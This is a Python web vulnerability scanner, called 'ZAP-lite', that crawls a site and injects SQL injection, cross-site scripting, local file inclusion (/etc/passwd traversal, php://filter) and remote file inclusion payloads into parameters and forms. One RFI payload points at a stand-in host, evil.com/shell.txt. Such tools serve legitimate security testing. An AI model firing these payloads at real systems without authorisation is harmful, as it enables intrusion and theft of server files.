#!/usr/bin/env python3
"""Active web scanner: spider, find forms, test SQLi/XSS/LFI/RFI, report with severity."""
import argparse
import re
import sys
from collections import deque
from html.parser import HTMLParser
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SQLI_PAYLOADS = ["'", "' OR '1'='1", "\" OR 1=1--", "1 UNION SELECT NULL--"]
XSS_PAYLOADS = ["<script>alert('ZAP')</script>", "\"><svg/onload=alert(1)>", "<img src=x onerror=prompt(1)>"]
LFI_PAYLOADS = ["../../../etc/passwd", "....//....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
                "/etc/passwd%00", "php://filter/convert.base64-encode/resource=/etc/passwd"]
RFI_PAYLOADS = ["http://evil.com/shell.txt", "https://evil.com/shell.txt?"]
SQL_ERRORS = [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"PostgreSQL.*ERROR", r"ORA-\d{5}",
              r"SQLITE_ERROR", r"Unclosed quotation mark", r"syntax error at or near"]
LFI_INDICATORS = ["root:x:", "root:0:0", "[extensions]", "for 16-bit app support", "daemon:x:"]


class LinkParser(HTMLParser):
    def __init__(self, base):
        super().__init__()
        self.base = base
        self.links = set()
        self.forms = []
        self._cur_form = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "a" and "href" in a:
            href = urljoin(self.base, a["href"])
            self.links.add(href)
        elif tag == "form":
            self._cur_form = {"action": a.get("action", ""), "method": a.get("method", "get").lower(), "inputs": []}
        elif tag == "input" and self._cur_form is not None:
            self._cur_form["inputs"].append({"name": a.get("name", ""), "type": a.get("type", "text"), "value": a.get("value", "")})

    def handle_endtag(self, tag):
        if tag == "form" and self._cur_form:
            self.forms.append(self._cur_form)
            self._cur_form = None


def spider(session, start_url, max_pages, timeout):
    parsed_start = urlparse(start_url)
    domain = parsed_start.netloc
    visited = set()
    queue = deque([start_url])
    all_links = set()
    all_forms = []
    while queue and len(visited) < max_pages:
        url = queue.popleft()
        if url in visited:
            continue
        visited.add(url)
        try:
            resp = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
            if "text/html" not in resp.headers.get("Content-Type", ""):
                continue
            parser = LinkParser(url)
            parser.feed(resp.text)
            for form in parser.forms:
                form["page"] = url
                all_forms.append(form)
            for link in parser.links:
                p = urlparse(link)
                clean = f"{p.scheme}://{p.netloc}{p.path}"
                if p.query:
                    clean += f"?{p.query}"
                if p.netloc == domain and clean not in visited:
                    queue.append(clean)
                    all_links.add(clean)
        except Exception:
            continue
    return visited, all_links, all_forms


def test_url_params(session, url, timeout):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    for param in params:
        tp = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        for payload in SQLI_PAYLOADS:
            tp[param] = payload
            try:
                r = session.get(base, params=tp, timeout=timeout, verify=False)
                for pat in SQL_ERRORS:
                    if re.search(pat, r.text, re.I):
                        findings.append({"vuln": "SQL Injection", "severity": "HIGH", "url": url, "param": param, "payload": payload})
                        break
            except Exception:
                continue
        for payload in XSS_PAYLOADS:
            tp[param] = payload
            try:
                r = session.get(base, params=tp, timeout=timeout, verify=False)
                if payload in r.text:
                    findings.append({"vuln": "Cross-Site Scripting (XSS)", "severity": "HIGH", "url": url, "param": param, "payload": payload})
            except Exception:
                continue
        for payload in LFI_PAYLOADS:
            tp[param] = payload
            try:
                r = session.get(base, params=tp, timeout=timeout, verify=False)
                for ind in LFI_INDICATORS:
                    if ind in r.text:
                        findings.append({"vuln": "Local File Inclusion (LFI)", "severity": "CRITICAL", "url": url, "param": param, "payload": payload})
                        break
            except Exception:
                continue
        for payload in RFI_PAYLOADS:
            tp[param] = payload
            try:
                r = session.get(base, params=tp, timeout=timeout, verify=False)
                if "evil.com" in r.text:
                    findings.append({"vuln": "Remote File Inclusion (RFI)", "severity": "CRITICAL", "url": url, "param": param, "payload": payload})
            except Exception:
                continue
    return findings


def test_forms(session, forms, timeout):
    findings = []
    for form in forms:
        action = urljoin(form["page"], form["action"]) if form["action"] else form["page"]
        for inp in form["inputs"]:
            if not inp["name"] or inp["type"] in ("submit", "button", "hidden"):
                continue
            for payload in SQLI_PAYLOADS[:2] + XSS_PAYLOADS[:2]:
                data = {i["name"]: i["value"] or "test" for i in form["inputs"] if i["name"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "post":
                        r = session.post(action, data=data, timeout=timeout, verify=False)
                    else:
                        r = session.get(action, params=data, timeout=timeout, verify=False)
                    for pat in SQL_ERRORS:
                        if re.search(pat, r.text, re.I):
                            findings.append({"vuln": "SQLi (form)", "severity": "HIGH", "url": action, "param": inp["name"], "payload": payload})
                            break
                    if payload in r.text and "<" in payload:
                        findings.append({"vuln": "XSS (form)", "severity": "HIGH", "url": action, "param": inp["name"], "payload": payload})
                except Exception:
                    continue
    return findings


def main():
    ap = argparse.ArgumentParser(description="ZAP-lite: Active web vulnerability scanner")
    ap.add_argument("target", help="Target URL (e.g., http://example.com)")
    ap.add_argument("-d", "--depth", type=int, default=20, help="Max pages to spider")
    ap.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    args = ap.parse_args()

    target = args.target if args.target.startswith("http") else f"https://{args.target}"
    session = requests.Session()
    session.headers["User-Agent"] = "PhantomStrike/1.0 ZAPLite"

    print(f"[*] ZAP-Lite Active Scanner")
    print(f"[*] Target: {target}")
    print(f"[*] Max spider depth: {args.depth}\n")

    print("[*] Phase 1: Spidering...")
    visited, links, forms = spider(session, target, args.depth, args.timeout)
    print(f"  [+] Pages crawled: {len(visited)}")
    print(f"  [+] Links found:   {len(links)}")
    print(f"  [+] Forms found:   {len(forms)}\n")

    urls_with_params = [u for u in visited | links if "?" in u]
    print(f"[*] Phase 2: Testing {len(urls_with_params)} URLs with parameters...")
    all_findings = []
    for url in urls_with_params:
        all_findings.extend(test_url_params(session, url, args.timeout))

    print(f"[*] Phase 3: Testing {len(forms)} forms...")
    all_findings.extend(test_forms(session, forms, args.timeout))

    seen = set()
    unique = []
    for f in all_findings:
        key = (f["vuln"], f["url"], f["param"])
        if key not in seen:
            seen.add(key)
            unique.append(f)

    print(f"\n{'='*60}")
    print(f"[*] SCAN RESULTS")
    print(f"{'='*60}\n")
    if unique:
        for i, f in enumerate(unique, 1):
            print(f"  [{f['severity']}] #{i} {f['vuln']}")
            print(f"    URL:       {f['url']}")
            print(f"    Parameter: {f['param']}")
            print(f"    Payload:   {f['payload']}\n")
    else:
        print("  [OK] No vulnerabilities detected\n")

    crit = sum(1 for f in unique if f["severity"] == "CRITICAL")
    high = sum(1 for f in unique if f["severity"] == "HIGH")
    print(f"[*] Pages crawled: {len(visited)} | Forms tested: {len(forms)}")
    print(f"[*] Findings: {len(unique)} ({crit} CRITICAL, {high} HIGH)")


if __name__ == "__main__":
    main()
